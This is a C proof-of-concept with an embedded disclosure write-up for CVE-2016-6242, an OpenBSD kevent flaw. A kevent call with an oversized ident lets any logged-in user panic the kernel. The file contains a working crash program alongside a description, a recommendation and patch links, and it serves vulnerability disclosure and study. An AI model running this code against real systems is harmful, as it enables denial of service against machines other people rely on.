/*
 * kevent_panic.c
 *    Demonstrate a panic through the kevent system call.
 *
 * gcc -g kevent_panic.c -o kevent_panic
 */

#ifdef BUG_WRITEUP //---------------------------------------------------
kevent with large ident can lead to a panic

Impact:
Any logged in user can use kevent to panic the kernel.

Description:
When processing a kevent system call, kqueue_register() is called
for each of the changes in the user-provided change list.  When 
processing changes with a filter of EVFILT_READ, kqueue_register()
creates a new knote, attaches the user-provided kevent (the change)
to it, and calls knote_attach().  This function resizes an internal
fdp->fd_knlist based on the value stored in kn->kn_id (which is
really kn->kn_kevent->ident).  This field is from the user-provided
kn->kn_kevent value and can be arbitrary.  The relevant code is:

    if (fdp->fd_knlistsize <= kn->kn_id) {
        size = fdp->fd_knlistsize;
        while (size <= kn->kn_id)
            size += KQEXTENT;
        list = mallocarray(size, sizeof(struct klist), M_TEMP,
            M_WAITOK);

If the original ident value is overly large, the value of "size" will
be correspondingly large, and can trigger an assertion in mallocarray().
This can be abused by any user to cause a kernel panic.

Reproduction:
Run the attached kevent_panic.c program.  It will cause a panic such as
"panic: mallocarray: overflow 18446744071562067968 * 8".  (Here the
value 18446744071562067968 is ffff.ffff.8000.0000 and was caused
by sign-extension of the "int size" variable when passing it in to
the "size_t nmemb" argument of mallocarra()).  NCC Group was 
able to reproduce this issue on OpenBSD 5.9 release running amd64.

Recommendation:
Validate the ident field of items in the change list. Return
an error when adding a change with an overly large ident field.
This can be done in knote_attach() or earlier in kqueue_register()
or sys_kevent().

Reported: 2016-07-13
Fixed:    http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/kern/kern_event.c.diff?r1=1.72&r2=1.73
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/019_kevent.patch.sig
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.8/common/022_kevent.patch.sig
Assigned: CVE-2016-6242
#endif // BUG_WRITEUP ---------------------------------------------------


#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/event.h>

void xperror(int cond, char *msg)
{
    if(cond) {
        perror(msg);
        exit(1);
    }
}

int main(int argc, char **argv)
{
    struct kevent chlist[1];
    int x, kq;

    kq = kqueue();
    xperror(kq == -1, "kqueue");

    memset(chlist, 0, 1 * sizeof chlist[0]);
    chlist[0].ident = 0x20000000000000;
    chlist[0].filter = EVFILT_READ;
    chlist[0].flags = EV_ADD;
    x = kevent(kq, chlist, 1, 0, 0, 0);
    xperror(x == -1, "kevent");
    printf("no crash!\n");
    return 0;
}
